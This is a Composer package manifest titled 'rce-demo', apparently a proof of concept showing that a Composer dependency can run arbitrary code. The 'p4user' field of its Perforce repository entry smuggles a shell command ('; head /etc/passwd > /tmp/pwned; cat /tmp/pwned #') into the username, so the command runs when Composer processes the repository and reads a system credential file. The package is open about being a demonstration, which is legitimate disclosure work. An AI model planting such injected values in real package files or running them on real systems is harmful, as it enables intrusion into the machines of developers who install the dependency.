{
    "name": "pyguerder/rce-demo",
    "description": "A package to show the possibility of running arbitrary code from a Composer dependency.",
    "type": "library",
    "license": "MIT",
    "authors": [
        {
            "name": "Pierre-Yves Guerder"
        }
    ],
    "require": {
        "php": ">=7.4",
        "dummy/perforce-package": "*"
    },
    "repositories": [
        {
            "type": "perforce",
            "url": "localhost:8080",
            "depot": "depot",
            "p4user": "user; head /etc/passwd > /tmp/pwned; cat /tmp/pwned #",
            "p4password": "test"
        }
    ],
    "require": {}
}
